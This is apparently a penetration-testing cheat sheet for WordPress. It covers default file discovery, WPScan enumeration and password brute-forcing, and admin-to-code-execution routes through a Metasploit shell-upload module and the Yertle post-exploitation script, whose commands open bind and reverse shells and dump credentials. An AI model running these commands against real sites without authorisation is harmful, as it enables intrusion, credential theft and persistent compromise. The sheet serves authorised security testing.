# Web applications - CMS WordPress

### Overview

WordPress is a free and open-source content management system (CMS) developed by
the WordPress.org foundation and based on PHP and MySQL.

WordPress is, by far, the most popular website management system in use with a
CMS market share of nearly sixty percent and used by more than 60 million
websites, including 30.6% of the top 10 million websites as of April 2018.

WordPress' plugin architecture allows users to extend the features and
functionality of a website or blog. As of March 2017, WordPress has over
55,286 plugins available.

### WordPress default URL

The following files and directories can be found on a default installation of
WordPress:

```
index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-app.php
wp-atom.php
wp-blog-header.php
wp-comments-post.php
wp-commentsrss2.php
wp-config-sample.php
wp-content
wp-cron.php
wp-feed.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-pass.php
wp-rdf.php
wp-register.php
wp-rss2.php
wp-rss.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
...
```

Refer to the SecLists' `Discovery/Web-Content/CMS/wordpress.fuzz.txt` wordlist
for a more exhaustive list of URL.

### WPScan

WPScan is a well-known vulnerability scanner written in Ruby for WordPress
which focus on vulnerabilities in WordPress core, themes, and plugins.

The WPScan vulnerability database is public and count, as of December 2018,
11665 vulnerabilities. The database is hosted on the following host:

```
https://wpvulndb.com/
```

Usage:

```
# Update the WordPress Core, themes and plugins vulnerability database
wpscan --update

wpscan --url <URL>

# Enumerate installed plugins | themes | users | timthumbs
wpscan --url <URL> --enumerate < p | t | u | tt >

# Wordlist password brute force on enumerated users using 50 threads
wpscan --url <URL> --wordlist <WORDLIST_PASSWORDS> --threads 50

# Wordlist usernames and password brute force using 50 threads
wpscan <URL> (--username <USERNAME> | --usernames <WORDLIST_USERNAMES>) --wordlist <WORDLIST_PASSWORDS> --threads 50
```

### Administrator to RCE

The tools presented below require valid WordPress administrator credentials.

###### Metasploit

The Metasploit module `exploit/unix/webapp/wp_admin_shell_upload` can be used
to generate a plugin packed with a Metasploit payload and upload it to the
WordPress server.

```
msf> use exploit/unix/webapp/wp_admin_shell_upload
```

###### WPForce Yertle

Part of the WPForce suite of Wordpress attack tools, Yertle is a WordPress
post-exploitation python script.

The following modules are implemented:

```
beef            Injects a BeEF hook into website
dbcreds         Prints the database credentials
exit            Terminate the session
hashdump        Dumps all WordPress password hashes
help            Help menu
keylogger       Patches WordPress core to log plaintext credentials
keylog          Displays keylog file
meterpreter     Executes a PHP meterpreter stager (php/meterpreter/reverse_tcp) to connect to metasploit
persist         Creates an admin account that will re-add itself
quit            Terminate the session
shell           Sends a TCP reverse shell to a netcat listener
stealth         Hides Yertle from the plugins page
```

Usage:

```
# Bind OS shell including the modules above
python yertle.py -u <USERNAME> -p <PASSWORD> -t <URL> -i
os-shell> help | hashdump | persist | whoami | ...

# Reverse OS shell - works with a netcat listener
python yertle.py -u <USERNAME> -p <PASSWORD> -t <URL> -r -li <LHOST> -lp <LPORT>
```
